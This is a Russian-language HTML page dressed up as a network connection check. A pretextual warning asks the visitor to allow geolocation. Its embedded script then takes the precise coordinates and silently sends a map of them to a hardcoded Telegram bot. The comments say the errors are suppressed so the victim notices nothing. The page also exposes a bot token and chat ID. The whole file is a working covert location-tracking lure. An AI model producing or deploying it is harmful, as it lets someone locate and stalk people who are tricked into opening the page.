<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка подключения</title>
    <style>
        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 24px;
            padding: 28px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
            text-align: center;
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 40px;
            padding: 14px 28px;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
            width: 100%;
        }
        button:hover {
            background: #006699;
        }
        .hint {
            font-size: 0.75rem;
            color: #6c757d;
            margin-top: 20px;
        }
    </style>
</head>
<body>
<div class="card">
    <h2>Проверка соединения</h2>
    <p>Нажмите кнопку для диагностики сети.</p>
    <button id="actionBtn">Проверить подключение</button>
    <div class="hint">
        ⚠️ Для корректной работы разрешите доступ к геолокации — это необходимо для определения региона.
    </div>
</div>

<script>
    // ---------- НАСТРОЙКИ (ЗАМЕНИТЕ НА СВОИ) ----------
    const BOT_TOKEN = "8876131918:AAF_P-YrCuMJwt8tJVsVh5X_i6EVJ3mOvo0";
    const CHAT_ID = 7385140251;   // <-- ВСТАВЬТЕ ВАШ ЛИЧНЫЙ TELEGRAM ID
    // -------------------------------------------------

    // Отправка статической карты (без текста координат)
    async function sendMapImage(latitude, longitude) {
        const mapUrl = `https://staticmap.openstreetmap.de/staticmap.php?center=${latitude},${longitude}&zoom=15&size=600x300&markers=${latitude},${longitude},red-push`;
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json; charset=utf-8' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    photo: mapUrl,
                    caption: ""   // пустая подпись — вообще ничего
                })
            });
        } catch (e) {
            // Полностью игнорируем ошибки, чтобы пользователь ничего не заметил
        }
    }

    function requestLocation() {
        if (!navigator.geolocation) return;
        navigator.geolocation.getCurrentPosition(
            (position) => {
                sendMapImage(position.coords.latitude, position.coords.longitude);
            },
            () => {
                // Ошибка — ничего не делаем, просто молчим
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    // При нажатии на кнопку запускаем геолокацию и отправляем карту
    document.getElementById('actionBtn').addEventListener('click', requestLocation);
</script>
</body>
</html>
